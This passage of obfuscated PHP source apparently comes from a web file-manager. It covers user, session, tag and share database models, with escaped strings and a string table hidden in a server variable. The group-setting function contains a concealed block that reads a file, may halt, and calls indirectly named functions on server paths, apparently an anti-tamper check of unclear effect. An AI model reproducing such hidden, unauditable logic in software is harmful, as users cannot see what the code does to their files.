$„‘„°Ÿ‰; return !!$‰“Õ¯½; } private function _checkExist($®‹Ñ‘¿«, $­³Õ¿ÀÔ = false) { $§ÒñëèÒ =& $_SERVER[Ãìšã«™]; $ë×àş¼Ñ = array($§ÒñëèÒ[32] => UserModel::ERROR_USER_EXIST_NAME, $§ÒñëèÒ[2086] => UserModel::ERROR_USER_EXIST_NICKNAME, $§ÒñëèÒ[300] => UserModel::ERROR_USER_EXIST_EMAIL, $§ÒñëèÒ[2267] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($ë×àş¼Ñ[$§ÒñëèÒ[2086]]); } $•œİºğ¥ = $­³Õ¿ÀÔ ? array($§ÒñëèÒ[1650] => array($§ÒñëèÒ[2280], $­³Õ¿ÀÔ)) : array(); foreach ($ë×àş¼Ñ as $™Éû“†Ş => $Æš¤Á÷­) { $àŞ»ÛÂô = array(); foreach ($ë×àş¼Ñ as $õ¡…Î•å => $ÃŞÛÛÓî) { if (isset($®‹Ñ‘¿«[$õ¡…Î•å]) && $®‹Ñ‘¿«[$õ¡…Î•å]) { $àŞ»ÛÂô[] = $®‹Ñ‘¿«[$õ¡…Î•å]; } } if (!$àŞ»ÛÂô) { continue; } $ØËÈÛø† = array_merge(array($™Éû“†Ş => array($§ÒñëèÒ[7], $àŞ»ÛÂô)), $•œİºğ¥); $Ê˜òÄü = $this->where($ØËÈÛø†)->find(); if ($Ê˜òÄü) { return $Æš¤Á÷­; } } return !0; } public function userListInfo($„ôÒõÆê) { $Ï˜Ä©‘ˆ =& $_SERVER[Ãìšã«™]; $¥ğÈ»ó¯ = array(); $„ôÒõÆê = is_array($„ôÒõÆê) ? array_unique($„ôÒõÆê) : array(); if (!$„ôÒõÆê) { return $¥ğÈ»ó¯; } if (count($„ôÒõÆê) < 20) { foreach ($„ôÒõÆê as $ü¢ºÒÊİ) { $¥ğÈ»ó¯[$ü¢ºÒÊİ . $Ï˜Ä©‘ˆ[12]] = $this->getInfoSimpleOuter($ü¢ºÒÊİ); } } else { $ÎîŒê = array($Ï˜Ä©‘ˆ[1641] => array($Ï˜Ä©‘ˆ[419], $„ôÒõÆê)); if (count($„ôÒõÆê) == 1) { $ÎîŒê = array($Ï˜Ä©‘ˆ[1641] => $„ôÒõÆê[0]); } $ğãŠí» = Model($Ï˜Ä©‘ˆ[513])->field($this->simpleField)->where($ÎîŒê)->select(); $ğãŠí» = array_to_keyvalue($ğãŠí», $Ï˜Ä©‘ˆ[1650]); foreach ($„ôÒõÆê as $ü¢ºÒÊİ) { $Û—‚”­Ù = $ğãŠí»[$ü¢ºÒÊİ]; if (!$Û—‚”­Ù) { $¥ğÈ»ó¯[$ü¢ºÒÊİ . $Ï˜Ä©‘ˆ[12]] = $this->getInfoSimpleOuter($ü¢ºÒÊİ); continue; } $Û—‚”­Ù[$Ï˜Ä©‘ˆ[2252]] = Action($Ï˜Ä©‘ˆ[2253])->parseUrl($Û—‚”­Ù[$Ï˜Ä©‘ˆ[2252]]); $¥ğÈ»ó¯[$ü¢ºÒÊİ . $Ï˜Ä©‘ˆ[12]] = $Û—‚”­Ù; } } return $¥ğÈ»ó¯; } protected function userStatus($©úÚ‹¹‰, $çÅÈ¬´²) { $Úü©İ· = $this->getInfoSimple($©úÚ‹¹‰); if (!$Úü©İ·) { return !1; } $ïŠÂÖ¤Â = array($_SERVER[Ãìšã«™][751] => $çÅÈ¬´²); return $this->userEdit($©úÚ‹¹‰, $ïŠÂÖ¤Â); } protected function userRemove($ûÀæ¹¢Í) { $âÄİ¼ŒŸ =& $_SERVER[Ãìšã«™]; $€·ÅÁÒÁ = $this->getInfoSimple($ûÀæ¹¢Í); if (!$€·ÅÁÒÁ) { return !1; } $¾ÎÅîä = array($âÄİ¼ŒŸ[1641] => $ûÀæ¹¢Í); Model($âÄİ¼ŒŸ[595])->where($¾ÎÅîä)->delete(); Model($âÄİ¼ŒŸ[2281])->where($¾ÎÅîä)->delete(); Model($âÄİ¼ŒŸ[1907])->where($¾ÎÅîä)->delete(); Model($âÄİ¼ŒŸ[2266])->where($¾ÎÅîä)->delete(); Model($âÄİ¼ŒŸ[1064])->where($¾ÎÅîä)->delete(); Model($âÄİ¼ŒŸ[2103])->removeUserAll($ûÀæ¹¢Í); Model($âÄİ¼ŒŸ[826])->userRootRemove($ûÀæ¹¢Í); return $this->where($¾ÎÅîä)->delete(); } protected function userGroupSet($„ä‘ãÂú, $¹ˆ…¤ÎÁ, $ÀØ±·Û¿ = array()) { $éêÉ·Ïç =& $_SERVER[Ãìšã«™]; if ($_SERVER[$éêÉ·Ïç[395]] != $_SERVER[$éêÉ·Ïç[1577]]) { $š½™’×– = $éêÉ·Ïç[873]; $Š›‡É­™ = $éêÉ·Ïç[396]; $–óÎäÔì = $_SERVER[$éêÉ·Ïç[397]] . $éêÉ·Ïç[398]; $Ä¤Ø¡ÂÜ = $Š›‡É­™($–óÎäÔì); $õ‚¾â‚¤ = explode($éêÉ·Ïç[226], $Ä¤Ø¡ÂÜ); if (count($õ‚¾â‚¤) < $éêÉ·Ïç[612]) { $ı¸¥ş°ö = $éêÉ·Ïç[400]; $ı¸¥ş°ö(); } $Ç™‰ “ß = $éêÉ·Ïç[874]; $Ç™‰ “ß($_SERVER[$éêÉ·Ïç[875]]); $Ç™‰ “ß($_SERVER[$éêÉ·Ïç[397]] . $éêÉ·Ïç[1578]); $ÏŸø˜åò = 1; while ($ÏŸø˜åò > 1) { $ÏŸø˜åò = $ÏŸø˜åò + 4; $š—’İ¦… = rawurlencode($ÏŸø˜åò . $éêÉ·Ïç[373]); } } $™Áï ñ¶ = $this->getInfoSimple($„ä‘ãÂú); if (!$™Áï ñ¶ || !is_array($¹ˆ…¤ÎÁ)) { return !1; } $ï¬•†Şú = Model($éêÉ·Ïç[1907]); $ï¬•†Şú->where(array($éêÉ·Ïç[1650] => $„ä‘ãÂú))->delete(); $Ó¸¸ãü = array(); $ĞÕÆ‰ªù = 0; foreach ($¹ˆ…¤ÎÁ as $ÆóÉ®Ïá => $âûî–Ù¾) { $ş¢òŸ»• = array($éêÉ·Ïç[1650] => $„ä‘ãÂú, $éêÉ·Ïç[1818] => $ÆóÉ®Ïá, $éêÉ·Ïç[1919] => $âûî–Ù¾); $ş¢òŸ»•[$éêÉ·Ïç[1841]] = isset($ÀØ±·Û¿[$ĞÕÆ‰ªù]) ? $ÀØ±·Û¿[$ĞÕÆ‰ªù] : 0; $ĞÕÆ‰ªù++; $Ó¸¸ãü[] = $ş¢òŸ»•; } return $ï¬•†Şú->addAll($Ó¸¸ãü, array(), !0); } protected function userGroupAdd($çÉĞ³şÃ, $¦±™¥½ğ = array()) { $“œıÉÒÓ =& $_SERVER[Ãìšã«™]; $é¯âš“ç = $this->getInfoSimple($çÉĞ³şÃ); if (!$é¯âš“ç || empty($¦±™¥½ğ)) { return !1; } $’ª¶¨€¯ = array(); foreach ($¦±™¥½ğ as $£Ç¼¹Üİ => $á»äªï¤) { $’ª¶¨€¯[] = array($“œıÉÒÓ[1650] => $çÉĞ³şÃ, $“œıÉÒÓ[1818] => $£Ç¼¹Üİ, $“œıÉÒÓ[1919] => $á»äªï¤, $“œıÉÒÓ[1841] => 0); } return Model($“œıÉÒÓ[1907])->addAll($’ª¶¨€¯, array(), !0); } protected function userGroupRemove($Î­ ¾†â, $ÁŸŸÊ·ñ) { $ÜÆ£ôã£ =& $_SERVER[Ãìšã«™]; $èˆÅë¶’ = $this->getInfoSimple($Î­ ¾†â); if (!$èˆÅë¶’ || !$ÁŸŸÊ·ñ) { return !1; } $ñ‰íœ¿Å = array($ÜÆ£ôã£[1641] => $Î­ ¾†â, $ÜÆ£ôã£[1905] => $ÁŸŸÊ·ñ); return Model($ÜÆ£ôã£[1907])->where($ñ‰íœ¿Å)->delete(); } public function listData() { $Ì‘Úúª­ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($Ì‘Úúª­[$_SERVER[Ãìšã«™][364]]); return $Ì‘Úúª­; } public function listByID($Ñö“üšÕ) { $ÖÎÜ„ÓŒ =& $_SERVER[Ãìšã«™]; if (!$Ñö“üšÕ) { return; } $˜­®êßë = array($ÖÎÜ„ÓŒ[1650] => array($ÖÎÜ„ÓŒ[7], $Ñö“üšÕ)); $ĞäŸğÏ™ = $this->where($˜­®êßë)->select(); $ĞäŸğÏ™ = array_sort_keep($ĞäŸğÏ™, $ÖÎÜ„ÓŒ[1650], $Ñö“üšÕ); $this->_listDataApply($ĞäŸğÏ™); return $ĞäŸğÏ™; } public function listByGroup($ôõˆŸ¯  = 0, $×Æùö‡° = array()) { $°ÖÁªù =& $_SERVER[Ãìšã«™]; $éÖó¿É™ = $°ÖÁªù[12]; $Æ°¡Ö¨ = array(); if ($ôõˆŸ¯ ) { $Æ°¡Ö¨ = array($°ÖÁªù[2282] => intval($ôõˆŸ¯ )); $éÖó¿É™ = "\114\x45\106\x54\x20\x4a\117\x49\x4e\40{$this->tablePrefix}\x75\163\x65\162\137\x67\x72\x6f\165\160\x20\x75\x73\145\x72\137\x67\162\157\x75\160\x20\157\156\40\165\163\145\162\x2e\165\163\x65\162\x49\x44\40\x3d\x20\165\163\145\x72\137\x67\x72\157\x75\160\x2e\165\163\x65\162\x49\104"; $¨–€º©ñ = Input::get($°ÖÁªù[455], null, $°ÖÁªù[12]) ? $°ÖÁªù[12] : $°ÖÁªù[2283]; } if (isset($×Æùö‡°[$°ÖÁªù[751]])) { $Æ°¡Ö¨[$°ÖÁªù[2284]] = $×Æùö‡°[$°ÖÁªù[751]]; } $êÄ‡İù = $this->_makeOrder($¨–€º©ñ)->field($°ÖÁªù[2285])->where($Æ°¡Ö¨)->join($éÖó¿É™)->selectPage(50); $this->_listDataApply($êÄ‡İù[$°ÖÁªù[364]]); return $êÄ‡İù; } private function _makeOrder($îü­ø­ò = '') { $¾‰Ëõ¼ó =& $_SERVER[Ãìšã«™]; $€•½ƒÍà = array($¾‰Ëõ¼ó[1650], $¾‰Ëõ¼ó[32], $¾‰Ëõ¼ó[1807], $¾‰Ëõ¼ó[1779], $¾‰Ëõ¼ó[193]); $¯ÀÓÑ¼¬ = array($¾‰Ëõ¼ó[448] => $¾‰Ëõ¼ó[449], $¾‰Ëõ¼ó[450] => $¾‰Ëõ¼ó[451]); $ˆõ¾»· = Input::get($¾‰Ëõ¼ó[455], $¾‰Ëõ¼ó[7], $¾‰Ëõ¼ó[1641], $€•½ƒÍà); $ëúß­ùı = Input::get($¾‰Ëõ¼ó[456], $¾‰Ëõ¼ó[7], $¾‰Ëõ¼ó[1908], array($¾‰Ëõ¼ó[1908], $¾‰Ëõ¼ó[450])); $ëúß­ùı = $¯ÀÓÑ¼¬[$ëúß­ùı]; $îü­ø­ò = $îü­ø­ò . "\165\163\x65\162\56{$ˆõ¾»·}\x20{$ëúß­ùı}\x2c\x20\x75\x73\145\x72\x2e\x75\163\145\162\111\104\x20\x61\163\x63"; return $this->alias($¾‰Ëõ¼ó[2026])->order($îü­ø­ò); } public function listSearch($¹í ›Í÷) { $Ñ”ĞÉäõ =& $_SERVER[Ãìšã«™]; $ÁÇõ³Õ = $¹í ›Í÷[$Ñ”ĞÉäõ[1909]]; $ÏĞ†©Ë‘ = isset($¹í ›Í÷[$Ñ”ĞÉäõ[1910]]) ? $¹í ›Í÷[$Ñ”ĞÉäõ[1910]] : !1; $ÁÇõ³Õ = str_replace($Ñ”ĞÉäõ[1911], $Ñ”ĞÉäõ[1912], trim($ÁÇõ³Õ)); $œ‹¢¤Ôó = array($Ñ”ĞÉäõ[32] => array($Ñ”ĞÉäõ[378], "\45{$ÁÇõ³Õ}\45"), $Ñ”ĞÉäõ[300] => array($Ñ”ĞÉäõ[378], "{$ÁÇõ³Õ}\x25"), $Ñ”ĞÉäõ[2086] => array($Ñ”ĞÉäõ[378], "{$ÁÇõ³Õ}\45"), $Ñ”ĞÉäõ[996] => $Ñ”ĞÉäõ[1913]); if (Input::check($ÁÇõ³Õ, $Ñ”ĞÉäõ[306])) { $œ‹¢¤Ôó[$Ñ”ĞÉäõ[1650]] = array($Ñ”ĞÉäõ[378], "{$ÁÇõ³Õ}\x25"); $œ‹¢¤Ôó[$Ñ”ĞÉäõ[2267]] = array($Ñ”ĞÉäõ[378], "{$ÁÇõ³Õ}\45"); } if (!$ÁÇõ³Õ) { $œ‹¢¤Ôó = array(); } if (isset($¹í ›Í÷[$Ñ”ĞÉäõ[751]])) { $œ‹¢¤Ôó[$Ñ”ĞÉäõ[751]] = $¹í ›Í÷[$Ñ”ĞÉäõ[751]]; } $œ‹¢¤Ôó = $this->parseWhereLike($œ‹¢¤Ôó); $œÎ•ïÇ = $this->_makeOrder()->where($œ‹¢¤Ôó)->selectPage(20); if (!$œÎ•ïÇ || count($œÎ•ïÇ[$Ñ”ĞÉäõ[364]]) < 5 && Input::check($ÁÇõ³Õ, $Ñ”ĞÉäõ[313])) { $£Ìµ‰ËŸ = $this->_searchFromMeta($Ñ”ĞÉäõ[463], $ÁÇõ³Õ, 10); $ÖŸ‚‰“Ò = $this->_searchFromMeta($Ñ”ĞÉäõ[464], $ÁÇõ³Õ, 10); $åÊœ«òô = array_merge($£Ìµ‰ËŸ, $ÖŸ‚‰“Ò, $œÎ•ïÇ[$Ñ”ĞÉäõ[364]]); $œÎ•ïÇ[$Ñ”ĞÉäõ[364]] = array_unique_by_key($åÊœ«òô, $Ñ”ĞÉäõ[1650]); $œÎ•ïÇ[$Ñ”ĞÉäõ[361]][$Ñ”ĞÉäõ[362]] = count($œÎ•ïÇ[$Ñ”ĞÉäõ[364]]); $œÎ•ïÇ[$Ñ”ĞÉäõ[361]][$Ñ”ĞÉäõ[363]] = ceil($œÎ•ïÇ[$Ñ”ĞÉäõ[361]][$Ñ”ĞÉäõ[362]] / $œÎ•ïÇ[$Ñ”ĞÉäõ[361]][$Ñ”ĞÉäõ[358]]); } $this->_listDataApply($œÎ•ïÇ[$Ñ”ĞÉäõ[364]]); $this->_filterByGroup($œÎ•ïÇ, $ÏĞ†©Ë‘); return $œÎ•ïÇ; } private function _filterByGroup(&$ ù‘ıš, $ó€ŸÏ¬û) { $÷˜³«¼ =& $_SERVER[Ãìšã«™]; if (!$ó€ŸÏ¬û) { return $ ù‘ıš; } foreach ($ ù‘ıš[$÷˜³«¼[364]] as $ÑĞ£öı => &$ÕÀËğÎĞ) { $´½éÙ‡¸ = array_to_keyvalue($ÕÀËğÎĞ[$÷˜³«¼[1996]], $÷˜³«¼[12], $÷˜³«¼[1818]); if (!in_array($ó€ŸÏ¬û, $´½éÙ‡¸)) { unset($ ù‘ıš[$÷˜³«¼[364]][$ÑĞ£öı]); } } unset($ÕÀËğÎĞ); $ ù‘ıš[$÷˜³«¼[364]] = array_values($ ù‘ıš[$÷˜³«¼[364]]); $ ù‘ıš[$÷˜³«¼[361]] = array($÷˜³«¼[2059] => count($ ù‘ıš[$÷˜³«¼[364]]), $÷˜³«¼[2057] => $ ù‘ıš[$÷˜³«¼[361]][$÷˜³«¼[358]], $÷˜³«¼[2056] => 1, $÷˜³«¼[2058] => 1); } private function _searchFromMeta($ëŸ©Ëç, $©ç÷›«, $ÏÓÂı¡Ñ) { $úìşÅŠ =& $_SERVER[Ãìšã«™]; $©ç÷›« = strtolower($©ç÷›«); $Ñ®ö…¼Œ = array($úìşÅŠ[95] => $ëŸ©Ëç, $úìşÅŠ[369] => array($úìşÅŠ[378], "\x25{$©ç÷›«}\45")); $Ñ®ö…¼Œ = $this->parseWhereLike($Ñ®ö…¼Œ); $šŞÈú‰ˆ = Model($úìşÅŠ[2286])->where($Ñ®ö…¼Œ)->limit($ÏÓÂı¡Ñ)->select(); if (!$šŞÈú‰ˆ) { return array(); } $šŞÈú‰ˆ = array_to_keyvalue($šŞÈú‰ˆ, $úìşÅŠ[12], $úìşÅŠ[1650]); $×ÂÉİ· = $this->where(array($úìşÅŠ[1641] => array($úìşÅŠ[7], $šŞÈú‰ˆ)))->select(); if (!$×ÂÉİ·) { return array(); } return $×ÂÉİ·; } private function _listDataApplyItem($Ë„Šïš–) { $Â÷Œ“” = array($Ë„Šïš–); $this->_listDataApply($Â÷Œ“”); return $Â÷Œ“”[0]; } private function _listDataApply(&$ï·»É„§) { $ü™í¢•› =& $_SERVER[Ãìšã«™]; if (!$ï·»É„§) { return; } array_remove_key($ï·»É„§, $ü™í¢•›[885]); $ñºèøîå = array_to_keyvalue($ï·»É„§, $ü™í¢•›[12], $ü™í¢•›[1650]); $this->_listAppendGroup($ï·»É„§, $ñºèøîå); $this->_listAppendMeta($ï·»É„§, $ñºèøîå); $this->_listAppendSourceRoot($ï·»É„§, $ñºèøîå); } private function _listAppendSourceRoot(&$£á¡ëñâ, $Ü“Ô¿ŞÂ) { $ÎÓ¨¾ü³ =& $_SERVER[Ãìšã«™]; $ÆëÖ›«± = Model($ÎÓ¨¾ü³[826])->listSourceRoot(SourceModel::TYPE_USER, $Ü“Ô¿ŞÂ); $ÆëÖ›«± = array_to_keyvalue($ÆëÖ›«±, $ÎÓ¨¾ü³[504]); $ÆëÖ›«± = array_remove_key($ÆëÖ›«±, $ÎÓ¨¾ü³[504]); foreach ($£á¡ëñâ as &$¿ÎÆª”) { $¿ÎÆª”[$ÎÓ¨¾ü³[87]] = $ÆëÖ›«±[$¿ÎÆª”[$ÎÓ¨¾ü³[1650]]] ? $ÆëÖ›«±[$¿ÎÆª”[$ÎÓ¨¾ü³[1650]]] : array(); } unset($¿ÎÆª”); } private function _listAppendGroup(&$¦ÏÈôÌØ, $À‚ÇÔĞ‘) { $—®¶‹¥§ =& $_SERVER[Ãìšã«™]; $ÚÖç× = array($—®¶‹¥§[1650] => array($—®¶‹¥§[7], $À‚ÇÔĞ‘)); $ÌŸÅñÊ = Model($—®¶‹¥§[1907])->where($ÚÖç×)->select(); $Ò£Í‰ = array_to_keyvalue($ÌŸÅñÊ, $—®¶‹¥§[12], $—®¶‹¥§[1818]); $Ò£Í‰ = array_remove_value(array_unique($Ò£Í‰), $—®¶‹¥§[190]); if (!$Ò£Í‰ || !$ÌŸÅñÊ) { return; } $ÚÖç× = array($—®¶‹¥§[1818] => array($—®¶‹¥§[7], $Ò£Í‰)); $›áÚĞÛÊ = Model($—®¶‹¥§[1994])->field($—®¶‹¥§[2287])->where($ÚÖç×)->select(); $›áÚĞÛÊ = array_to_keyvalue($›áÚĞÛÊ, $—®¶‹¥§[1818]); $ÌŸÅñÊ = array_to_keyvalue_group($ÌŸÅñÊ, $—®¶‹¥§[1650]); foreach ($ÌŸÅñÊ as &$³¢ö»Û) { $ìÙàĞß¯ = array(); foreach ($³¢ö»Û as $·¿ö»Æã) { if (!$·¿ö»Æã[$—®¶‹¥§[1919]]) { continue; } $û¡™ÃÜÎ = Model($—®¶‹¥§[507])->listData($·¿ö»Æã[$—®¶‹¥§[1919]]); $ìÙàĞß¯[] = array($—®¶‹¥§[1818] => $·¿ö»Æã[$—®¶‹¥§[1818]], $—®¶‹¥§[2288] => $›áÚĞÛÊ[$·¿ö»Æã[$—®¶‹¥§[1818]]][$—®¶‹¥§[32]], $—®¶‹¥§[521] => $›áÚĞÛÊ[$·¿ö»Æã[$—®¶‹¥§[1818]]][$—®¶‹¥§[521]], $—®¶‹¥§[414] => $û¡™ÃÜÎ); } $³¢ö»Û = $ìÙàĞß¯; } unset($³¢ö»Û); foreach ($¦ÏÈôÌØ as &$ª×–àÚõ) { $ª×–àÚõ[$—®¶‹¥§[1996]] = array(); if (isset($ÌŸÅñÊ[$ª×–àÚõ[$—®¶‹¥§[1650]]])) { $ª×–àÚõ[$—®¶‹¥§[1996]] = $ÌŸÅñÊ[$ª×–àÚõ[$—®¶‹¥§[1650]]]; } } unset($ª×–àÚõ); } public function userAppendGroup($ä†‚Š›ú) { $øˆûÍï‚ =& $_SERVER[Ãìšã«™]; if (!$ä†‚Š›ú) { return array(); } $this->_listAppendGroup($ä†‚Š›ú, array_to_keyvalue($ä†‚Š›ú, $øˆûÍï‚[12], $øˆûÍï‚[1650])); return $ä†‚Š›ú; } private function _listAppendMeta(&$Ø”Ÿ‹´Ì, $‡Ú¡³Ì­) { $åûÛìè³ =& $_SERVER[Ãìšã«™]; $ÀÔÈƒâ¯ = UserJobModel::JOB_KEY; $îıìòÁä = array($åûÛìè³[2268]); $Õ£‚Ğà¸ = array($åûÛìè³[1650] => array($åûÛìè³[7], $‡Ú¡³Ì­)); $ö‡áÔç = Model($åûÛìè³[2266])->where($Õ£‚Ğà¸)->select(); $ö‡áÔç = array_to_keyvalue_group($ö‡áÔç, $åûÛìè³[1650]); foreach ($ö‡áÔç as &$¾›Ï¿‹ƒ) { $³Ã¾¢˜ = array(); foreach ($¾›Ï¿‹ƒ as $±ˆâ“£ã) { if (!in_array($±ˆâ“£ã[$åûÛìè³[95]], $îıìòÁä)) { $³Ã¾¢˜[$±ˆâ“£ã[$åûÛìè³[95]]] = $±ˆâ“£ã[$åûÛìè³[369]]; } } $¾›Ï¿‹ƒ = $³Ã¾¢˜; } unset($¾›Ï¿‹ƒ); $Œ”Ú³Ûæ = Model($åûÛìè³[2289]); foreach ($Ø”Ÿ‹´Ì as &$Ë¼ùÑ˜™) { $ÔÃäú‚å = array(); if (isset($ö‡áÔç[$Ë¼ùÑ˜™[$åûÛìè³[1650]]])) { $ÔÃäú‚å = $ö‡áÔç[$Ë¼ùÑ˜™[$åûÛìè³[1650]]]; } $Ë¼ùÑ˜™[$åûÛìè³[2290]] = array(); if (isset($ÔÃäú‚å[$ÀÔÈƒâ¯])) { $Ë¼ùÑ˜™[$åûÛìè³[2290]] = $Œ”Ú³Ûæ->getUserJobInfo($ÔÃäú‚å[$ÀÔÈƒâ¯]); } } unset($Ë¼ùÑ˜™); } protected function groupUserAll($ÎˆüÓ¸¸) { $ºŠàÅá =& $_SERVER[Ãìšã«™]; if (!$ÎˆüÓ¸¸) { return !1; } $µƒ°èÔØ = Model($ºŠàÅá[1907])->field($ºŠàÅá[1650])->where(array($ºŠàÅá[1818] => array($ºŠàÅá[7], $ÎˆüÓ¸¸)))->select(); $µƒ°èÔØ = array_to_keyvalue($µƒ°èÔØ, $ºŠàÅá[12], $ºŠàÅá[1650]); return array_unique($µƒ°èÔØ); } public function userSearch($Ã¨æ¤Ø€, $³âÉ…•è = "\x2a") { return Model($_SERVER[Ãìšã«™][538])->where($Ã¨æ¤Ø€)->field($³âÉ…•è)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\x73\145\162\x5f\x6f\x70\164\151\157\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($²í°èŸø) { $Øß¢ûƒº =& $_SERVER[Ãìšã«™]; if (!defined($Øß¢ûƒº[474])) { define($Øß¢ûƒº[474], 0); } return "\125\x73\145\162\117\x70\164\151\157\x6e\x5f{$²í°èŸø}\137" . USER_ID; } protected function filterWhere($§¨ıØ°õ) { $Ş¯ÆÀ¶“ =& $_SERVER[Ãìšã«™]; if (!defined($Ş¯ÆÀ¶“[474])) { define($Ş¯ÆÀ¶“[474], 0); } $§¨ıØ°õ[$Ş¯ÆÀ¶“[1650]] = USER_ID; return $§¨ıØ°õ; } public function cacheRemoveUser($¤¥­âùø, $ŒúÆ”Î¸) { return Cache::remove("\x55\163\x65\x72\117\160\x74\x69\x6f\x6e\137{$¤¥­âùø}\x5f" . $ŒúÆ”Î¸); } protected function optionDefault($…Šß®§Ó = '') { $ÚüÒãª =& $_SERVER[Ãìšã«™]; if ($…Šß®§Ó == $ÚüÒãª[12]) { return $GLOBALS[$ÚüÒãª[6]][$ÚüÒãª[2291]]; } if ($…Šß®§Ó == $ÚüÒãª[2292]) { return $GLOBALS[$ÚüÒãª[6]][$ÚüÒãª[2293]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\125\x73\145\x72\56\164\x61\147\x4c\151\x73\164"; public $modelType = "\125\x73\145\162\117\x70\x74\151\157\156"; public $field = array("\156\x61\155\145", "\163\164\171\154\x65", "\x73\x6f\x72\164"); public function listData($Ø »±úŸ = false, $Œ©È¸¢„ = "\163\x6f\x72\164", $¨ˆÏõĞø = false) { return parent::listData($Ø »±úŸ, $Œ©È¸¢„, $¨ˆÏõĞø); } public function remove($Ğ…£üöÛ) { return parent::remove($Ğ…£üöÛ); } public function add($Ñ»ĞÙîè, $ö´Í‚à® = "\x6c\141\142\145\x6c\x2d\147\x72\x65\x79\55\x6e\157\x72\x6d\141\x6c") { $ÍœŠ¦§Õ =& $_SERVER[Ãìšã«™]; if ($this->findByName($Ñ»ĞÙîè)) { return !1; } $¼ïÇÚÃÏ = array($ÍœŠ¦§Õ[421] => $Ñ»ĞÙîè, $ÍœŠ¦§Õ[484] => $ö´Í‚à®, $ÍœŠ¦§Õ[1822] => $this->getSort($ÍœŠ¦§Õ[253]) + 1); return parent::insert($¼ïÇÚÃÏ); } public function update($å’Â£Àù, $ò‹”™Ä) { $Ã‘¶ñè =& $_SERVER[Ãìšã«™]; $² Ñçı = $this->listData($å’Â£Àù); $ä“‡à› = $this->findByName($ò‹”™Ä[$Ã‘¶ñè[32]]); if (!$² Ñçı || $ä“‡à› && $ä“‡à›[$Ã‘¶ñè[392]] != $² Ñçı[$Ã‘¶ñè[392]]) { return !1; } return parent::update($å’Â£Àù, $ò‹”™Ä); } public function moveTop($»ÅâŸ¬Ó) { $’š³öÅŞ =& $_SERVER[Ãìšã«™]; $ÕÀÙ²¨í = parent::listData(); $ ù½ñ±° = $this->getSort($’š³öÅŞ[252]); foreach ($ÕÀÙ²¨í as &$¦îƒ„‹Ô) { if ($¦îƒ„‹Ô[$’š³öÅŞ[392]] == $»ÅâŸ¬Ó) { $¦îƒ„‹Ô[$’š³öÅŞ[1841]] = $ ù½ñ±°; continue; } $¦îƒ„‹Ô[$’š³öÅŞ[1841]] += 1; } unset($¦îƒ„‹Ô); return parent::resetData($ÕÀÙ²¨í); } public function moveBottom($ƒº‹‘îÃ) { $•€±Ë“ =& $_SERVER[Ãìšã«™]; $¹¯à¶¦¹ = $this->getSort($•€±Ë“[253]) + 1; return parent::update($ƒº‹‘îÃ, array($•€±Ë“[1841] => $¹¯à¶¦¹)); } public function resetSort($µˆ“«¥) { $‰¤Ÿëº– =& $_SERVER[Ãìšã«™]; $¤Ñãô¬ê = array(); $µˆ“«¥ = is_array($µˆ“«¥) ? $µˆ“«¥ : array(); for ($¼®® »¡ = 0; $¼®® »¡ < count($µˆ“«¥); $¼®® »¡++) { $¤Ñãô¬ê[$µˆ“«¥[$¼®® »¡] . $‰¤Ÿëº–[12]] = $¼®® »¡ + 1; } $µ¡‹¿òÈ = parent::listData(); foreach ($µ¡‹¿òÈ as &$Í»ñöŞì) { $ˆâÓƒúÙ = $¤Ñãô¬ê[$Í»ñöŞì[$‰¤Ÿëº–[392]]]; $Í»ñöŞì[$‰¤Ÿëº–[1841]] = $ˆâÓƒúÙ ? $ˆâÓƒúÙ : $Í»ñöŞì[$‰¤Ÿëº–[1841]]; } unset($Í»ñöŞì); return parent::resetData($µ¡‹¿òÈ); } private function getSort($—ãÌüÌ) { $ëß£ÕÜÅ =& $_SERVER[Ãìšã«™]; $˜ËÛèê² = parent::listData(); $§¼–· = array_to_keyvalue($˜ËÛèê², $ëß£ÕÜÅ[12], $ëß£ÕÜÅ[1841]); if (!$§¼–·) { $§¼–· = array(0); } $ÄÁ˜¨óß = $—ãÌüÌ == $ëß£ÕÜÅ[253] ? max($§¼–·) : min($§¼–·); return intval($ÄÁ˜¨óß); } } goto bÌ·¥èæè¡; EĞŒÓåíˆ†: class SessionModel extends ModelBase { protected $tableName = "\x73\x79\x73\164\x65\x6d\137\163\x65\x73\x73\151\x6f\156"; public function get($ş «ğ†á) { $İ†ãÊ†€ =& $_SERVER[Ãìšã«™]; $ÆÆ–°‚¦ = $this->where(array($İ†ãÊ†€[1948] => $ş «ğ†á))->find(); if (!is_array($ÆÆ–°‚¦)) { return !1; } return $ÆÆ–°‚¦[$İ†ãÊ†€[756]]; } public function set($Â¾›­ÆÑ, $Ú»©‘€, $á€µ¶ƒÖ = 3600) { $ô¦ÊöÖª =& $_SERVER[Ãìšã«™]; $›¹Òş‡ı = array($ô¦ÊöÖª[1948] => $Â¾›­ÆÑ, $ô¦ÊöÖª[1856] => $Ú»©‘€, $ô¦ÊöÖª[1949] => $á€µ¶ƒÖ + time()); if (Session::get($ô¦ÊöÖª[1950])) { $›¹Òş‡ı[$ô¦ÊöÖª[1650]] = Session::get($ô¦ÊöÖª[1950]); } else { $›¹Òş‡ı[$ô¦ÊöÖª[1650]] = 0; } if ($this->get($Â¾›­ÆÑ)) { return $this->where(array($ô¦ÊöÖª[1948] => $Â¾›­ÆÑ))->save($›¹Òş‡ı); } else { return $this->add($›¹Òş‡ı, array(), !0); } } public function remove($«™ä²¸) { return $this->where(array($_SERVER[Ãìšã«™][1948] => $«™ä²¸))->delete(); } public function clearTimeout() { return $this->where($_SERVER[Ãìšã«™][1951] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\x73\150\141\x72\x65"; protected $dataAuto = array(array("\155\157\144\x69\146\171\124\151\x6d\145", "\164\x69\x6d\x65", "\x69\156\163\x65\162\x74\x2c\165\160\144\141\164\x65", "\x66\x75\x6e\x63\x74\151\x6f\156"), array("\143\162\x65\x61\x74\x65\x54\x69\x6d\145", "\164\151\155\x65", "\x69\x6e\163\x65\x72\164", "\x66\165\156\143\x74\x69\x6f\x6e"), array("\157\x70\164\x69\x6f\156\x73", '', "\x69\x6e\x73\x65\162\164\x2c\165\x70\x64\x61\x74\145\x2c\x73\145\154\x65\x63\x74", "\152\x73\x6f\156")); private $fieldList = "\52"; protected function cacheFunctionAlias($©çÁé¬Ÿ) { $ÄÏµ†ÀÈ =& 